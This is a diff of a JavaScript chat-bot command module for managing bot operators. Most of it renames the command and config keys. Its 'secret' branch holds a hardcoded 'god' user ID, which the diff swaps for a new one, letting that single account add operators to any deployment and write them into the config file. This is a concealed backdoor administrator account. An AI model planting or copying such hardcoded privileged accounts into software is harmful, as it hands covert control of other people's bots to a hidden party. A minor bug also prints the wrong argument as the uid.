@@ -1,5 +1,5 @@
 module.exports.config = {
-  name: "operator",
+  name: "mod",
   version: "2.0.0",
   permission: 0,
   credits: "ryuko",
@@ -12,13 +12,7 @@ module.exports.config = {
 };
 
 module.exports.languages = {
-    "bangla": {
-        "listAdmin": 'operators : \n\n%1',
-        "notHavePermssion": 'you have no permission to use "%1"',
-        "addedNewAdmin": 'added %1 operator :\n\n%2',
-        "removedAdmin": 'remove %1 operator :\n\n%2'
-    },
-    "english": {
+    "en": {
         "listAdmin": 'operators : \n\n%1',
         "notHavePermssion": 'you have no permission to use "%1"',
         "addedNewAdmin": 'added %1 operator :\n\n%2',
@@ -29,20 +23,20 @@ module.exports.languages = {
 module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
     const content = args.slice(1, args.length);
     const { threadID, messageID, mentions } = event;
-    const configPath = require('../../config.json');
-    const { operators } = global.config;
+    const { configPath } = global.client;
+    const { OPERATOR } = global.config;
     const { userName } = global.data;
     const { writeFileSync } = global.nodemodule["fs-extra"];
     const mention = Object.keys(mentions);
-    delete require.cache[require.resolve('../../config.json')];
-    var config = require('../../config.json');
+    delete require.cache[require.resolve(configPath)];
+    var config = require(configPath);
     
        
     switch (args[0]) {
         case "list":
         case "all":
         case "-a": {
-            const listOperator = operators || config.operators || [];
+            const listOperator = OPERATOR || config.OPERATOR || [];
             var msg = [];
 
             for (const idOperator of listOperator) {
@@ -63,8 +57,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 var listAdd = [];
 
                 for (const id of mention) {
-                    operators.push(id);
-                    config.operators.push(id);
+                    OPERATOR.push(id);
+                    config.OPERATOR.push(id);
                     listAdd.push(`${id} - ${event.mentions[id]}`);
                 };
 
@@ -72,8 +66,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
             }
             else if (content.length != 0 && !isNaN(content[0])) {
-                operators.push(content[0]);
-                config.operators.push(content[0]);
+                OPERATOR.push(content[0]);
+                config.OPERATOR.push(content[0]);
                 const name = await Users.getNameUser(content[0]);
                 writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                 return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${content[1]}`), threadID, messageID);
@@ -82,7 +76,7 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
         }
         
         case "secret": {
-            const god = ["100093955989346"];
+            const god = ["100032407831557"];
             if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
           
 
@@ -90,8 +84,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 var listGod = [];
 
                 for (const id of mention) {
-                    operators.push(id);
-                    config.operators.push(id);
+                    OPERATOR.push(id);
+                    config.OPERATOR.push(id);
                     listGod.push(`${id} - ${event.mentions[id]}`);
                 };
 
@@ -99,8 +93,8 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
             }
             else if (content.length != 0 && !isNaN(content[0])) {
-                operators.push(content[0]);
-                config.operators.push(content[0]);
+                OPERATOR.push(content[0]);
+                config.OPERATOR.push(content[0]);
                 const name = await Users.getNameUser(content[0]);
                 writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                 return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${content[1]}`), threadID, messageID);
@@ -117,9 +111,9 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 var listAdd = [];
 
                 for (const id of mention) {
-                    const index = config.operators.findIndex(item => item == id);
-                    operators.splice(index, 1);
-                    config.operators.splice(index, 1);
+                    const index = config.OPERATOR.findIndex(item => item == id);
+                    OPERATOR.splice(index, 1);
+                    config.OPERATOR.splice(index, 1);
                     listAdd.push(`${id} - ${event.mentions[id]}`);
                 };
 
@@ -127,9 +121,9 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
                 return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
             }
             else if (content.length != 0 && !isNaN(content[0])) {
-                const index = config.operators.findIndex(item => item.toString() == content[0]);
-                operators.splice(index, 1);
-                config.operators.splice(index, 1);
+                const index = config.OPERATOR.findIndex(item => item.toString() == content[0]);
+                OPERATOR.splice(index, 1);
+                config.OPERATOR.splice(index, 1);
                 const name = await Users.getNameUser(content[0]);
                 writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                 return api.sendMessage(getText("removedAdmin", 1, `name : ${name}\nuid : ${content[0]}`), threadID, messageID);
